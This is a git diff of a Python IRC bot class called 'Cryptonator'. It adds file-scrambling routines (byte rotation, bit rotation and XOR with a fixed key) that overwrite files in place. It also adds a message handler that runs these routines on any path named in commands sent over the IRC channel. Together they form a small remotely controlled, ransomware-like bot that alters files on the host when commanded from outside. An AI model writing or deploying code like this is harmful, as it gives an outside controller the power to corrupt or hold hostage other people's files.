@@ -23,6 +23,10 @@ class Cryptonator:
         self.irc_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.port = 6667
 
+    #############
+    # IRC FUNCS #
+    #############
+
     def connect(self):
 
         # Connect to server
@@ -61,12 +65,97 @@ class Cryptonator:
 
         return 2
 
+    ################
+    # CRYPTO FUNCS #
+    ################
+
+    def bin_rot(self, path, encrypt=True):
+
+        # Read file's bytes
+        f_bytes = []
+        with open(path, 'rb') as f:
+            f_bytes = f.read()
+
+        # Rotate in appropriate direction
+        displacement = 2 if encrypt else -2
+
+        # Rotate bytes
+        f_bytes = f_bytes[displacement:] + f_bytes[:displacement]
+
+        # Output to same filepath
+        with open(path, 'wb') as f:
+            f.write(f_bytes)
+
+    # Auxiliary functions for all_byte_rot
+    def rotate_left(self, byte):
+        leftmost = 1 if (byte & 128) > 0 else 0
+        ret = byte << 1
+        ret |= leftmost
+
+        return ret & 255
+
+    def rotate_right(self, byte):
+        rightmost = byte & 1
+        ret = byte >> 1
+        
+        if rightmost > 0:
+            ret |= 128
+
+        return ret & 255
+
+
+    def byte_rot(self, path, encrypt=True):
+
+        # Read file's bytes
+        f_bytes = []
+        with open(path, 'rb') as f:
+            f_bytes = f.read()
+
+        # Rotate bytes
+        f_bytes_list = list(f_bytes)
+        for i, byte in enumerate(f_bytes_list):
+            
+            if encrypt:
+                f_bytes_list[i] = self.rotate_left(byte)
+            else:
+                f_bytes_list[i] = self.rotate_right(byte)
+
+        # Output to same filepath
+        with open(path, 'wb') as f:
+            f.write(bytes(f_bytes_list))
+
+    def byte_xor(self, path):
+
+        # Read file's bytes
+        f_bytes = []
+        with open(path, 'rb') as f:
+            f_bytes = f.read()
+
+        # Rotate bytes
+        f_bytes_list = list(f_bytes)
+        for i, byte in enumerate(f_bytes_list):
+            
+            # Encrypt / decrypt with XOR
+            f_bytes_list[i] ^= 185
+
+        # Output to same filepath
+        with open(path, 'wb') as f:
+            f.write(bytes(f_bytes_list))
+
+    def byte_rot_xor(self, path, encrypt=True):
+
+        if encrypt:
+            self.byte_rot(path)
+            self.byte_xor(path)
+        else:
+            self.byte_xor(path)
+            self.byte_rot(path, encrypt)
+
     def eval(self):
         
         # Get current message
         msg = self.irc_sock.recv(2048).decode('UTF-8')
         msg = msg.strip('\n\r')
-        print(msg)
 
         # Special case for server pings
         if 'PING :' in msg:
@@ -86,6 +175,26 @@ class Cryptonator:
         # Choose what action to take
         if 'Hello' in text:
             return self.tell('World!')
+
+        elif 'FILE:' in text:
+            command = text.split(' FILE:')[0]
+            path = text.split(' FILE:')[1]
+            print(command, path)
+
+            if command == 'bin rot encrypt':
+                self.bin_rot(path)
+            elif command == 'bin rot decrypt':
+                self.bin_rot(path, False)
+            elif command == 'byte rot encrypt':
+                self.byte_rot(path)
+            elif command == 'byte rot decrypt':
+                self.byte_rot(path, False)
+            elif command == 'byte xor':
+                self.byte_xor(path)
+            elif command == 'byte rotxor encrypt':
+                self.byte_rot_xor(path)
+            elif command == 'byte rotxor decrypt':
+                self.byte_rot_xor(path, False)
 
         elif 'EXIT' in text:
             return self.exit()
